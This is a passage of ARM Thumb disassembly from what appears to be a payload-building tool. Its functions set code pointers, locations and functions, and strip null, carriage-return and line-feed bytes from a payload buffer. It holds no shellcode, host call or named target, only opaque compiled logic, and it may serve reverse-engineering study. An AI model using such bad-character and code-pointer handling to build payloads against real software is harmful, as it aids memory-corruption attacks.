    b5e6:	d107      	bne.n	b5f8 <set_code_ptr+0xf8>
    b5e8:	f646 2388 	movw	r3, #27272	; 0x6a88
    b5ec:	f2c0 0301 	movt	r3, #1
    b5f0:	f240 1231 	movw	r2, #305	; 0x131
    b5f4:	609a      	str	r2, [r3, #8]
    b5f6:	e0de      	b.n	b7b6 <set_code_ptr+0x2b6>
    b5f8:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b5fc:	f2c0 0301 	movt	r3, #1
    b600:	699b      	ldr	r3, [r3, #24]
    b602:	6878      	ldr	r0, [r7, #4]
    b604:	4619      	mov	r1, r3
    b606:	f7fd e956 	blx	88b4 <_init+0x20>
    b60a:	4603      	mov	r3, r0
    b60c:	2b00      	cmp	r3, #0
    b60e:	d107      	bne.n	b620 <set_code_ptr+0x120>
    b610:	f646 2388 	movw	r3, #27272	; 0x6a88
    b614:	f2c0 0301 	movt	r3, #1
    b618:	f44f 7299 	mov.w	r2, #306	; 0x132
    b61c:	609a      	str	r2, [r3, #8]
    b61e:	e0ca      	b.n	b7b6 <set_code_ptr+0x2b6>
    b620:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b624:	f2c0 0301 	movt	r3, #1
    b628:	69db      	ldr	r3, [r3, #28]
    b62a:	6878      	ldr	r0, [r7, #4]
    b62c:	4619      	mov	r1, r3
    b62e:	f7fd e942 	blx	88b4 <_init+0x20>
    b632:	4603      	mov	r3, r0
    b634:	2b00      	cmp	r3, #0
    b636:	d107      	bne.n	b648 <set_code_ptr+0x148>
    b638:	f646 2388 	movw	r3, #27272	; 0x6a88
    b63c:	f2c0 0301 	movt	r3, #1
    b640:	f240 1233 	movw	r2, #307	; 0x133
    b644:	609a      	str	r2, [r3, #8]
    b646:	e0b6      	b.n	b7b6 <set_code_ptr+0x2b6>
    b648:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b64c:	f2c0 0301 	movt	r3, #1
    b650:	6a1b      	ldr	r3, [r3, #32]
    b652:	6878      	ldr	r0, [r7, #4]
    b654:	4619      	mov	r1, r3
    b656:	f7fd e92e 	blx	88b4 <_init+0x20>
    b65a:	4603      	mov	r3, r0
    b65c:	2b00      	cmp	r3, #0
    b65e:	d107      	bne.n	b670 <set_code_ptr+0x170>
    b660:	f646 2388 	movw	r3, #27272	; 0x6a88
    b664:	f2c0 0301 	movt	r3, #1
    b668:	f44f 729a 	mov.w	r2, #308	; 0x134
    b66c:	609a      	str	r2, [r3, #8]
    b66e:	e0a2      	b.n	b7b6 <set_code_ptr+0x2b6>
    b670:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b674:	f2c0 0301 	movt	r3, #1
    b678:	6a5b      	ldr	r3, [r3, #36]	; 0x24
    b67a:	6878      	ldr	r0, [r7, #4]
    b67c:	4619      	mov	r1, r3
    b67e:	f7fd e91a 	blx	88b4 <_init+0x20>
    b682:	4603      	mov	r3, r0
    b684:	2b00      	cmp	r3, #0
    b686:	d107      	bne.n	b698 <set_code_ptr+0x198>
    b688:	f646 2388 	movw	r3, #27272	; 0x6a88
    b68c:	f2c0 0301 	movt	r3, #1
    b690:	f240 1235 	movw	r2, #309	; 0x135
    b694:	609a      	str	r2, [r3, #8]
    b696:	e08e      	b.n	b7b6 <set_code_ptr+0x2b6>
    b698:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b69c:	f2c0 0301 	movt	r3, #1
    b6a0:	6a9b      	ldr	r3, [r3, #40]	; 0x28
    b6a2:	6878      	ldr	r0, [r7, #4]
    b6a4:	4619      	mov	r1, r3
    b6a6:	f7fd e906 	blx	88b4 <_init+0x20>
    b6aa:	4603      	mov	r3, r0
    b6ac:	2b00      	cmp	r3, #0
    b6ae:	d107      	bne.n	b6c0 <set_code_ptr+0x1c0>
    b6b0:	f646 2388 	movw	r3, #27272	; 0x6a88
    b6b4:	f2c0 0301 	movt	r3, #1
    b6b8:	f44f 729b 	mov.w	r2, #310	; 0x136
    b6bc:	609a      	str	r2, [r3, #8]
    b6be:	e07a      	b.n	b7b6 <set_code_ptr+0x2b6>
    b6c0:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b6c4:	f2c0 0301 	movt	r3, #1
    b6c8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
    b6ca:	6878      	ldr	r0, [r7, #4]
    b6cc:	4619      	mov	r1, r3
    b6ce:	f7fd e8f2 	blx	88b4 <_init+0x20>
    b6d2:	4603      	mov	r3, r0
    b6d4:	2b00      	cmp	r3, #0
    b6d6:	d107      	bne.n	b6e8 <set_code_ptr+0x1e8>
    b6d8:	f646 2388 	movw	r3, #27272	; 0x6a88
    b6dc:	f2c0 0301 	movt	r3, #1
    b6e0:	f240 1237 	movw	r2, #311	; 0x137
    b6e4:	609a      	str	r2, [r3, #8]
    b6e6:	e066      	b.n	b7b6 <set_code_ptr+0x2b6>
    b6e8:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b6ec:	f2c0 0301 	movt	r3, #1
    b6f0:	6b1b      	ldr	r3, [r3, #48]	; 0x30
    b6f2:	6878      	ldr	r0, [r7, #4]
    b6f4:	4619      	mov	r1, r3
    b6f6:	f7fd e8de 	blx	88b4 <_init+0x20>
    b6fa:	4603      	mov	r3, r0
    b6fc:	2b00      	cmp	r3, #0
    b6fe:	d107      	bne.n	b710 <set_code_ptr+0x210>
    b700:	f646 2388 	movw	r3, #27272	; 0x6a88
    b704:	f2c0 0301 	movt	r3, #1
    b708:	f44f 729c 	mov.w	r2, #312	; 0x138
    b70c:	609a      	str	r2, [r3, #8]
    b70e:	e052      	b.n	b7b6 <set_code_ptr+0x2b6>
    b710:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b714:	f2c0 0301 	movt	r3, #1
    b718:	6b5b      	ldr	r3, [r3, #52]	; 0x34
    b71a:	6878      	ldr	r0, [r7, #4]
    b71c:	4619      	mov	r1, r3
    b71e:	f7fd e8ca 	blx	88b4 <_init+0x20>
    b722:	4603      	mov	r3, r0
    b724:	2b00      	cmp	r3, #0
    b726:	d107      	bne.n	b738 <set_code_ptr+0x238>
    b728:	f646 2388 	movw	r3, #27272	; 0x6a88
    b72c:	f2c0 0301 	movt	r3, #1
    b730:	f240 1239 	movw	r2, #313	; 0x139
    b734:	609a      	str	r2, [r3, #8]
    b736:	e03e      	b.n	b7b6 <set_code_ptr+0x2b6>
    b738:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b73c:	f2c0 0301 	movt	r3, #1
    b740:	6b9b      	ldr	r3, [r3, #56]	; 0x38
    b742:	6878      	ldr	r0, [r7, #4]
    b744:	4619      	mov	r1, r3
    b746:	f7fd e8b6 	blx	88b4 <_init+0x20>
    b74a:	4603      	mov	r3, r0
    b74c:	2b00      	cmp	r3, #0
    b74e:	d107      	bne.n	b760 <set_code_ptr+0x260>
    b750:	f646 2388 	movw	r3, #27272	; 0x6a88
    b754:	f2c0 0301 	movt	r3, #1
    b758:	f44f 729d 	mov.w	r2, #314	; 0x13a
    b75c:	609a      	str	r2, [r3, #8]
    b75e:	e02a      	b.n	b7b6 <set_code_ptr+0x2b6>
    b760:	f246 03d8 	movw	r3, #24792	; 0x60d8
    b764:	f2c0 0301 	movt	r3, #1
    b768:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
    b76a:	6878      	ldr	r0, [r7, #4]
    b76c:	4619      	mov	r1, r3
    b76e:	f7fd e8a2 	blx	88b4 <_init+0x20>
    b772:	4603      	mov	r3, r0
    b774:	2b00      	cmp	r3, #0
    b776:	d107      	bne.n	b788 <set_code_ptr+0x288>
    b778:	f646 2388 	movw	r3, #27272	; 0x6a88
    b77c:	f2c0 0301 	movt	r3, #1
    b780:	f240 123b 	movw	r2, #315	; 0x13b
    b784:	609a      	str	r2, [r3, #8]
    b786:	e016      	b.n	b7b6 <set_code_ptr+0x2b6>
    b788:	f646 0350 	movw	r3, #26704	; 0x6850
    b78c:	f2c0 0301 	movt	r3, #1
    b790:	681b      	ldr	r3, [r3, #0]
    b792:	2b00      	cmp	r3, #0
    b794:	d00c      	beq.n	b7b0 <set_code_ptr+0x2b0>
    b796:	f646 0360 	movw	r3, #26720	; 0x6860
    b79a:	f2c0 0301 	movt	r3, #1
    b79e:	681b      	ldr	r3, [r3, #0]
    b7a0:	4618      	mov	r0, r3
    b7a2:	f24d 21cc 	movw	r1, #53964	; 0xd2cc
    b7a6:	f2c0 0100 	movt	r1, #0
    b7aa:	687a      	ldr	r2, [r7, #4]
    b7ac:	f7fd e912 	blx	89d4 <_init+0x140>
    b7b0:	2001      	movs	r0, #1
    b7b2:	f7fd e8fe 	blx	89b0 <_init+0x11c>
    b7b6:	3708      	adds	r7, #8
    b7b8:	46bd      	mov	sp, r7
    b7ba:	bd80      	pop	{r7, pc}

0000b7bc <set_location>:
    b7bc:	b580      	push	{r7, lr}
    b7be:	b082      	sub	sp, #8
    b7c0:	af00      	add	r7, sp, #0
    b7c2:	6078      	str	r0, [r7, #4]
    b7c4:	f246 131c 	movw	r3, #24860	; 0x611c
    b7c8:	f2c0 0301 	movt	r3, #1
    b7cc:	681b      	ldr	r3, [r3, #0]
    b7ce:	6878      	ldr	r0, [r7, #4]
    b7d0:	4619      	mov	r1, r3
    b7d2:	f7fd e870 	blx	88b4 <_init+0x20>
    b7d6:	4603      	mov	r3, r0
    b7d8:	2b00      	cmp	r3, #0
    b7da:	d107      	bne.n	b7ec <set_location+0x30>
    b7dc:	f646 2388 	movw	r3, #27272	; 0x6a88
    b7e0:	f2c0 0301 	movt	r3, #1
    b7e4:	f44f 72c8 	mov.w	r2, #400	; 0x190
    b7e8:	60da      	str	r2, [r3, #12]
    b7ea:	e052      	b.n	b892 <set_location+0xd6>
    b7ec:	f246 131c 	movw	r3, #24860	; 0x611c
    b7f0:	f2c0 0301 	movt	r3, #1
    b7f4:	685b      	ldr	r3, [r3, #4]
    b7f6:	6878      	ldr	r0, [r7, #4]
    b7f8:	4619      	mov	r1, r3
    b7fa:	f7fd e85c 	blx	88b4 <_init+0x20>
    b7fe:	4603      	mov	r3, r0
    b800:	2b00      	cmp	r3, #0
    b802:	d107      	bne.n	b814 <set_location+0x58>
    b804:	f646 2388 	movw	r3, #27272	; 0x6a88
    b808:	f2c0 0301 	movt	r3, #1
    b80c:	f240 1291 	movw	r2, #401	; 0x191
    b810:	60da      	str	r2, [r3, #12]
    b812:	e03e      	b.n	b892 <set_location+0xd6>
    b814:	f246 131c 	movw	r3, #24860	; 0x611c
    b818:	f2c0 0301 	movt	r3, #1
    b81c:	689b      	ldr	r3, [r3, #8]
    b81e:	6878      	ldr	r0, [r7, #4]
    b820:	4619      	mov	r1, r3
    b822:	f7fd e848 	blx	88b4 <_init+0x20>
    b826:	4603      	mov	r3, r0
    b828:	2b00      	cmp	r3, #0
    b82a:	d107      	bne.n	b83c <set_location+0x80>
    b82c:	f646 2388 	movw	r3, #27272	; 0x6a88
    b830:	f2c0 0301 	movt	r3, #1
    b834:	f44f 72c9 	mov.w	r2, #402	; 0x192
    b838:	60da      	str	r2, [r3, #12]
    b83a:	e02a      	b.n	b892 <set_location+0xd6>
    b83c:	f246 131c 	movw	r3, #24860	; 0x611c
    b840:	f2c0 0301 	movt	r3, #1
    b844:	68db      	ldr	r3, [r3, #12]
    b846:	6878      	ldr	r0, [r7, #4]
    b848:	4619      	mov	r1, r3
    b84a:	f7fd e834 	blx	88b4 <_init+0x20>
    b84e:	4603      	mov	r3, r0
    b850:	2b00      	cmp	r3, #0
    b852:	d107      	bne.n	b864 <set_location+0xa8>
    b854:	f646 2388 	movw	r3, #27272	; 0x6a88
    b858:	f2c0 0301 	movt	r3, #1
    b85c:	f240 1293 	movw	r2, #403	; 0x193
    b860:	60da      	str	r2, [r3, #12]
    b862:	e016      	b.n	b892 <set_location+0xd6>
    b864:	f646 0350 	movw	r3, #26704	; 0x6850
    b868:	f2c0 0301 	movt	r3, #1
    b86c:	681b      	ldr	r3, [r3, #0]
    b86e:	2b00      	cmp	r3, #0
    b870:	d00c      	beq.n	b88c <set_location+0xd0>
    b872:	f646 0360 	movw	r3, #26720	; 0x6860
    b876:	f2c0 0301 	movt	r3, #1
    b87a:	681b      	ldr	r3, [r3, #0]
    b87c:	4618      	mov	r0, r3
    b87e:	f24d 21f8 	movw	r1, #54008	; 0xd2f8
    b882:	f2c0 0100 	movt	r1, #0
    b886:	687a      	ldr	r2, [r7, #4]
    b888:	f7fd e8a4 	blx	89d4 <_init+0x140>
    b88c:	2001      	movs	r0, #1
    b88e:	f7fd e890 	blx	89b0 <_init+0x11c>
    b892:	3708      	adds	r7, #8
    b894:	46bd      	mov	sp, r7
    b896:	bd80      	pop	{r7, pc}

0000b898 <set_function>:
    b898:	b580      	push	{r7, lr}
    b89a:	b082      	sub	sp, #8
    b89c:	af00      	add	r7, sp, #0
    b89e:	6078      	str	r0, [r7, #4]
    b8a0:	f246 1330 	movw	r3, #24880	; 0x6130
    b8a4:	f2c0 0301 	movt	r3, #1
    b8a8:	681b      	ldr	r3, [r3, #0]
    b8aa:	6878      	ldr	r0, [r7, #4]
    b8ac:	4619      	mov	r1, r3
    b8ae:	f7fd e802 	blx	88b4 <_init+0x20>
    b8b2:	4603      	mov	r3, r0
    b8b4:	2b00      	cmp	r3, #0
    b8b6:	d107      	bne.n	b8c8 <set_function+0x30>
    b8b8:	f646 2388 	movw	r3, #27272	; 0x6a88
    b8bc:	f2c0 0301 	movt	r3, #1
    b8c0:	f44f 72fa 	mov.w	r2, #500	; 0x1f4
    b8c4:	611a      	str	r2, [r3, #16]
    b8c6:	e0ba      	b.n	ba3e <set_function+0x1a6>
    b8c8:	f246 1330 	movw	r3, #24880	; 0x6130
    b8cc:	f2c0 0301 	movt	r3, #1
    b8d0:	685b      	ldr	r3, [r3, #4]
    b8d2:	6878      	ldr	r0, [r7, #4]
    b8d4:	4619      	mov	r1, r3
    b8d6:	f7fc efee 	blx	88b4 <_init+0x20>
    b8da:	4603      	mov	r3, r0
    b8dc:	2b00      	cmp	r3, #0
    b8de:	d107      	bne.n	b8f0 <set_function+0x58>
    b8e0:	f646 2388 	movw	r3, #27272	; 0x6a88
    b8e4:	f2c0 0301 	movt	r3, #1
    b8e8:	f240 12f5 	movw	r2, #501	; 0x1f5
    b8ec:	611a      	str	r2, [r3, #16]
    b8ee:	e0a6      	b.n	ba3e <set_function+0x1a6>
    b8f0:	f246 1330 	movw	r3, #24880	; 0x6130
    b8f4:	f2c0 0301 	movt	r3, #1
    b8f8:	689b      	ldr	r3, [r3, #8]
    b8fa:	6878      	ldr	r0, [r7, #4]
    b8fc:	4619      	mov	r1, r3
    b8fe:	f7fc efda 	blx	88b4 <_init+0x20>
    b902:	4603      	mov	r3, r0
    b904:	2b00      	cmp	r3, #0
    b906:	d107      	bne.n	b918 <set_function+0x80>
    b908:	f646 2388 	movw	r3, #27272	; 0x6a88
    b90c:	f2c0 0301 	movt	r3, #1
    b910:	f44f 72fb 	mov.w	r2, #502	; 0x1f6
    b914:	611a      	str	r2, [r3, #16]
    b916:	e092      	b.n	ba3e <set_function+0x1a6>
    b918:	f246 1330 	movw	r3, #24880	; 0x6130
    b91c:	f2c0 0301 	movt	r3, #1
    b920:	68db      	ldr	r3, [r3, #12]
    b922:	6878      	ldr	r0, [r7, #4]
    b924:	4619      	mov	r1, r3
    b926:	f7fc efc6 	blx	88b4 <_init+0x20>
    b92a:	4603      	mov	r3, r0
    b92c:	2b00      	cmp	r3, #0
    b92e:	d107      	bne.n	b940 <set_function+0xa8>
    b930:	f646 2388 	movw	r3, #27272	; 0x6a88
    b934:	f2c0 0301 	movt	r3, #1
    b938:	f240 12f7 	movw	r2, #503	; 0x1f7
    b93c:	611a      	str	r2, [r3, #16]
    b93e:	e07e      	b.n	ba3e <set_function+0x1a6>
    b940:	f246 1330 	movw	r3, #24880	; 0x6130
    b944:	f2c0 0301 	movt	r3, #1
    b948:	691b      	ldr	r3, [r3, #16]
    b94a:	6878      	ldr	r0, [r7, #4]
    b94c:	4619      	mov	r1, r3
    b94e:	f7fc efb2 	blx	88b4 <_init+0x20>
    b952:	4603      	mov	r3, r0
    b954:	2b00      	cmp	r3, #0
    b956:	d107      	bne.n	b968 <set_function+0xd0>
    b958:	f646 2388 	movw	r3, #27272	; 0x6a88
    b95c:	f2c0 0301 	movt	r3, #1
    b960:	f44f 72fc 	mov.w	r2, #504	; 0x1f8
    b964:	611a      	str	r2, [r3, #16]
    b966:	e06a      	b.n	ba3e <set_function+0x1a6>
    b968:	f246 1330 	movw	r3, #24880	; 0x6130
    b96c:	f2c0 0301 	movt	r3, #1
    b970:	695b      	ldr	r3, [r3, #20]
    b972:	6878      	ldr	r0, [r7, #4]
    b974:	4619      	mov	r1, r3
    b976:	f7fc ef9e 	blx	88b4 <_init+0x20>
    b97a:	4603      	mov	r3, r0
    b97c:	2b00      	cmp	r3, #0
    b97e:	d107      	bne.n	b990 <set_function+0xf8>
    b980:	f646 2388 	movw	r3, #27272	; 0x6a88
    b984:	f2c0 0301 	movt	r3, #1
    b988:	f240 12f9 	movw	r2, #505	; 0x1f9
    b98c:	611a      	str	r2, [r3, #16]
    b98e:	e056      	b.n	ba3e <set_function+0x1a6>
    b990:	f246 1330 	movw	r3, #24880	; 0x6130
    b994:	f2c0 0301 	movt	r3, #1
    b998:	699b      	ldr	r3, [r3, #24]
    b99a:	6878      	ldr	r0, [r7, #4]
    b99c:	4619      	mov	r1, r3
    b99e:	f7fc ef8a 	blx	88b4 <_init+0x20>
    b9a2:	4603      	mov	r3, r0
    b9a4:	2b00      	cmp	r3, #0
    b9a6:	d107      	bne.n	b9b8 <set_function+0x120>
    b9a8:	f646 2388 	movw	r3, #27272	; 0x6a88
    b9ac:	f2c0 0301 	movt	r3, #1
    b9b0:	f44f 72fd 	mov.w	r2, #506	; 0x1fa
    b9b4:	611a      	str	r2, [r3, #16]
    b9b6:	e042      	b.n	ba3e <set_function+0x1a6>
    b9b8:	f246 1330 	movw	r3, #24880	; 0x6130
    b9bc:	f2c0 0301 	movt	r3, #1
    b9c0:	69db      	ldr	r3, [r3, #28]
    b9c2:	6878      	ldr	r0, [r7, #4]
    b9c4:	4619      	mov	r1, r3
    b9c6:	f7fc ef76 	blx	88b4 <_init+0x20>
    b9ca:	4603      	mov	r3, r0
    b9cc:	2b00      	cmp	r3, #0
    b9ce:	d107      	bne.n	b9e0 <set_function+0x148>
    b9d0:	f646 2388 	movw	r3, #27272	; 0x6a88
    b9d4:	f2c0 0301 	movt	r3, #1
    b9d8:	f240 12fb 	movw	r2, #507	; 0x1fb
    b9dc:	611a      	str	r2, [r3, #16]
    b9de:	e02e      	b.n	ba3e <set_function+0x1a6>
    b9e0:	f246 1330 	movw	r3, #24880	; 0x6130
    b9e4:	f2c0 0301 	movt	r3, #1
    b9e8:	6a1b      	ldr	r3, [r3, #32]
    b9ea:	6878      	ldr	r0, [r7, #4]
    b9ec:	4619      	mov	r1, r3
    b9ee:	f7fc ef62 	blx	88b4 <_init+0x20>
    b9f2:	4603      	mov	r3, r0
    b9f4:	2b00      	cmp	r3, #0
    b9f6:	d107      	bne.n	ba08 <set_function+0x170>
    b9f8:	f646 2388 	movw	r3, #27272	; 0x6a88
    b9fc:	f2c0 0301 	movt	r3, #1
    ba00:	f44f 72fe 	mov.w	r2, #508	; 0x1fc
    ba04:	611a      	str	r2, [r3, #16]
    ba06:	e01a      	b.n	ba3e <set_function+0x1a6>
    ba08:	f246 1330 	movw	r3, #24880	; 0x6130
    ba0c:	f2c0 0301 	movt	r3, #1
    ba10:	6a5b      	ldr	r3, [r3, #36]	; 0x24
    ba12:	6878      	ldr	r0, [r7, #4]
    ba14:	4619      	mov	r1, r3
    ba16:	f7fc ef4e 	blx	88b4 <_init+0x20>
    ba1a:	4603      	mov	r3, r0
    ba1c:	2b00      	cmp	r3, #0
    ba1e:	d107      	bne.n	ba30 <set_function+0x198>
    ba20:	f646 2388 	movw	r3, #27272	; 0x6a88
    ba24:	f2c0 0301 	movt	r3, #1
    ba28:	f240 12fd 	movw	r2, #509	; 0x1fd
    ba2c:	611a      	str	r2, [r3, #16]
    ba2e:	e006      	b.n	ba3e <set_function+0x1a6>
    ba30:	f646 2388 	movw	r3, #27272	; 0x6a88
    ba34:	f2c0 0301 	movt	r3, #1
    ba38:	f44f 72ff 	mov.w	r2, #510	; 0x1fe
    ba3c:	611a      	str	r2, [r3, #16]
    ba3e:	3708      	adds	r7, #8
    ba40:	46bd      	mov	sp, r7
    ba42:	bd80      	pop	{r7, pc}

0000ba44 <contains_terminating_char>:
    ba44:	b480      	push	{r7}
    ba46:	b085      	sub	sp, #20
    ba48:	af00      	add	r7, sp, #0
    ba4a:	6078      	str	r0, [r7, #4]
    ba4c:	2300      	movs	r3, #0
    ba4e:	60fb      	str	r3, [r7, #12]
    ba50:	e012      	b.n	ba78 <contains_terminating_char+0x34>
    ba52:	687b      	ldr	r3, [r7, #4]
    ba54:	72fb      	strb	r3, [r7, #11]
    ba56:	7afb      	ldrb	r3, [r7, #11]
    ba58:	2b00      	cmp	r3, #0
    ba5a:	d005      	beq.n	ba68 <contains_terminating_char+0x24>
    ba5c:	7afb      	ldrb	r3, [r7, #11]
    ba5e:	2b0d      	cmp	r3, #13
    ba60:	d002      	beq.n	ba68 <contains_terminating_char+0x24>
    ba62:	7afb      	ldrb	r3, [r7, #11]
    ba64:	2b0a      	cmp	r3, #10
    ba66:	d101      	bne.n	ba6c <contains_terminating_char+0x28>
    ba68:	2301      	movs	r3, #1
    ba6a:	e009      	b.n	ba80 <contains_terminating_char+0x3c>
    ba6c:	687b      	ldr	r3, [r7, #4]
    ba6e:	0a1b      	lsrs	r3, r3, #8
    ba70:	607b      	str	r3, [r7, #4]
    ba72:	68fb      	ldr	r3, [r7, #12]
    ba74:	3301      	adds	r3, #1
    ba76:	60fb      	str	r3, [r7, #12]
    ba78:	68fb      	ldr	r3, [r7, #12]
    ba7a:	2b03      	cmp	r3, #3
    ba7c:	d9e9      	bls.n	ba52 <contains_terminating_char+0xe>
    ba7e:	2300      	movs	r3, #0
    ba80:	4618      	mov	r0, r3
    ba82:	3714      	adds	r7, #20
    ba84:	46bd      	mov	sp, r7
    ba86:	f85d 7b04 	ldr.w	r7, [sp], #4
    ba8a:	4770      	bx	lr

0000ba8c <remove_all_terminating_chars>:
    ba8c:	b480      	push	{r7}
    ba8e:	b085      	sub	sp, #20
    ba90:	af00      	add	r7, sp, #0
    ba92:	6078      	str	r0, [r7, #4]
    ba94:	6039      	str	r1, [r7, #0]
    ba96:	2300      	movs	r3, #0
    ba98:	60fb      	str	r3, [r7, #12]
    ba9a:	e029      	b.n	baf0 <remove_all_terminating_chars+0x64>
    ba9c:	687a      	ldr	r2, [r7, #4]
    ba9e:	68fb      	ldr	r3, [r7, #12]
    baa0:	4413      	add	r3, r2
    baa2:	781b      	ldrb	r3, [r3, #0]
    baa4:	2b00      	cmp	r3, #0
    baa6:	d00b      	beq.n	bac0 <remove_all_terminating_chars+0x34>
    baa8:	687a      	ldr	r2, [r7, #4]
    baaa:	68fb      	ldr	r3, [r7, #12]
    baac:	4413      	add	r3, r2
    baae:	781b      	ldrb	r3, [r3, #0]
    bab0:	2b0d      	cmp	r3, #13
    bab2:	d005      	beq.n	bac0 <remove_all_terminating_chars+0x34>
    bab4:	687a      	ldr	r2, [r7, #4]
    bab6:	68fb      	ldr	r3, [r7, #12]
    bab8:	4413      	add	r3, r2
    baba:	781b      	ldrb	r3, [r3, #0]
    babc:	2b0a      	cmp	r3, #10
    babe:	d107      	bne.n	bad0 <remove_all_terminating_chars+0x44>
    bac0:	687a      	ldr	r2, [r7, #4]
    bac2:	68fb      	ldr	r3, [r7, #12]
    bac4:	4413      	add	r3, r2
    bac6:	781a      	ldrb	r2, [r3, #0]
    bac8:	3201      	adds	r2, #1
    baca:	b2d2      	uxtb	r2, r2
    bacc:	701a      	strb	r2, [r3, #0]
    bace:	e00c      	b.n	baea <remove_all_terminating_chars+0x5e>
    bad0:	687a      	ldr	r2, [r7, #4]
    bad2:	68fb      	ldr	r3, [r7, #12]
    bad4:	4413      	add	r3, r2
    bad6:	781b      	ldrb	r3, [r3, #0]
    bad8:	2bff      	cmp	r3, #255	; 0xff
    bada:	d106      	bne.n	baea <remove_all_terminating_chars+0x5e>
    badc:	687a      	ldr	r2, [r7, #4]
    bade:	68fb      	ldr	r3, [r7, #12]
    bae0:	4413      	add	r3, r2
    bae2:	781a      	ldrb	r2, [r3, #0]
    bae4:	3a01      	subs	r2, #1
    bae6:	b2d2      	uxtb	r2, r2
    bae8:	701a      	strb	r2, [r3, #0]
    baea:	68fb      	ldr	r3, [r7, #12]
    baec:	3301      	adds	r3, #1
    baee:	60fb      	str	r3, [r7, #12]
    baf0:	68fa      	ldr	r2, [r7, #12]
    baf2:	683b      	ldr	r3, [r7, #0]
    baf4:	429a      	cmp	r2, r3
    baf6:	d3d1      	bcc.n	ba9c <remove_all_terminating_chars+0x10>
    baf8:	3714      	adds	r7, #20
    bafa:	46bd      	mov	sp, r7
    bafc:	f85d 7b04 	ldr.w	r7, [sp], #4
    bb00:	4770      	bx	lr
    bb02:	bf00      	nop

0000bb04 <remove_nulls>:
    bb04:	b480      	push	{r7}
    bb06:	b085      	sub	sp, #20
    bb08:	af00      	add	r7, sp, #0
    bb0a:	6078      	str	r0, [r7, #4]
    bb0c:	6039      	str	r1, [r7, #0]
    bb0e:	2300      	movs	r3, #0
    bb10:	60fb      	str	r3, [r7, #12]
    bb12:	e00f      	b.n	bb34 <remove_nulls+0x30>
    bb14:	687a      	ldr	r2, [r7, #4]
    bb16:	68fb      	ldr	r3, [r7, #12]
    bb18:	4413      	add	r3, r2
    bb1a:	781b      	ldrb	r3, [r3, #0]
    bb1c:	2b00      	cmp	r3, #0
    bb1e:	d106      	bne.n	bb2e <remove_nulls+0x2a>
    bb20:	687a      	ldr	r2, [r7, #4]
    bb22:	68fb      	ldr	r3, [r7, #12]
    bb24:	4413      	add	r3, r2
    bb26:	781a      	ldrb	r2, [r3, #0]
    bb28:	3201      	adds	r2, #1
    bb2a:	b2d2      	uxtb	r2, r2
    bb2c:	701a      	strb	r2, [r3, #0]
    bb2e:	68fb      	ldr	r3, [r7, #12]
    bb30:	3301      	adds	r3, #1
    bb32:	60fb      	str	r3, [r7, #12]
    bb34:	68fa      	ldr	r2, [r7, #12]
    bb36:	683b      	ldr	r3, [r7, #0]
    bb38:	429a      	cmp	r2, r3
    bb3a:	d3eb      	bcc.n	bb14 <remove_nulls+0x10>
    bb3c:	3714      	adds	r7, #20
    bb3e:	46bd      	mov	sp, r7
    bb40:	f85d 7b04 	ldr.w	r7, [sp], #4
    bb44:	4770      	bx	lr
    bb46:	bf00      	nop

0000bb48 <print_payload_info>:
    bb48:	b580      	push	{r7, lr}
    bb4a:	b082      	sub	sp, #8
    bb4c:	af00      	add	r7, sp, #0
    bb4e:	6078      	str	r0, [r7, #4]
    bb50:	6039      	str	r1, [r7, #0]
    bb52:	683b      	ldr	r3, [r7, #0]
    bb54:	681b      	ldr	r3, [r3, #0]
    bb56:	3bc8      	subs	r3, #200	; 0xc8
    bb58:	2b04      	cmp	r3, #4
    bb5a:	d83f      	bhi.n	bbdc <print_payload_info+0x94>
    bb5c:	a201      	add	r2, pc, #4	; (adr r2, bb64 <print_payload_info+0x1c>)
    bb5e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
    bb62:	bf00      	nop
    bb64:	0000bb79 	.word	0x0000bb79
    bb68:	0000bb8d 	.word	0x0000bb8d
    bb6c:	0000bba1 	.word	0x0000bba1
    bb70:	0000bbb5 	.word	0x0000bbb5
    bb74:	0000bbc9 	.word	0x0000bbc9
    bb78:	f24d 3028 	movw	r0, #54056	; 0xd328
    bb7c:	f2c0 0000 	movt	r0, #0
    bb80:	2101      	movs	r1, #1
    bb82:	221f      	movs	r2, #31
    bb84:	687b      	ldr	r3, [r7, #4]
    bb86:	f7fc eede 	blx	8944 <_init+0xb0>
    bb8a:	e03e      	b.n	bc0a <print_payload_info+0xc2>
    bb8c:	f24d 3048 	movw	r0, #54088	; 0xd348
    bb90:	f2c0 0000 	movt	r0, #0
    bb94:	2101      	movs	r1, #1
    bb96:	2223      	movs	r2, #35	; 0x23
    bb98:	687b      	ldr	r3, [r7, #4]
    bb9a:	f7fc eed4 	blx	8944 <_init+0xb0>
    bb9e:	e034      	b.n	bc0a <print_payload_info+0xc2>
    bba0:	f24d 306c 	movw	r0, #54124	; 0xd36c
    bba4:	f2c0 0000 	movt	r0, #0
    bba8:	2101      	movs	r1, #1
    bbaa:	2228      	movs	r2, #40	; 0x28
    bbac:	687b      	ldr	r3, [r7, #4]
    bbae:	f7fc eeca 	blx	8944 <_init+0xb0>
    bbb2:	e02a      	b.n	bc0a <print_payload_info+0xc2>
    bbb4:	f24d 3098 	movw	r0, #54168	; 0xd398
    bbb8:	f2c0 0000 	movt	r0, #0
    bbbc:	2101      	movs	r1, #1
    bbbe:	2228      	movs	r2, #40	; 0x28
    bbc0:	687b      	ldr	r3, [r7, #4]
    bbc2:	f7fc eec0 	blx	8944 <_init+0xb0>
    bbc6:	e020      	b.n	bc0a <print_payload_info+0xc2>
    bbc8:	f24d 30c4 	movw	r0, #54212	; 0xd3c4
    bbcc:	f2c0 0000 	movt	r0, #0
    bbd0:	2101      	movs	r1, #1
    bbd2:	2239      	movs	r2, #57	; 0x39
    bbd4:	687b      	ldr	r3, [r7, #4]
    bbd6:	f7fc eeb6 	blx	8944 <_init+0xb0>
    bbda:	e016      	b.n	bc0a <print_payload_info+0xc2>
    bbdc:	f646 0350 	movw	r3, #26704	; 0x6850
    bbe0:	f2c0 0301 	movt	r3, #1
    bbe4:	681b      	ldr	r3, [r3, #0]
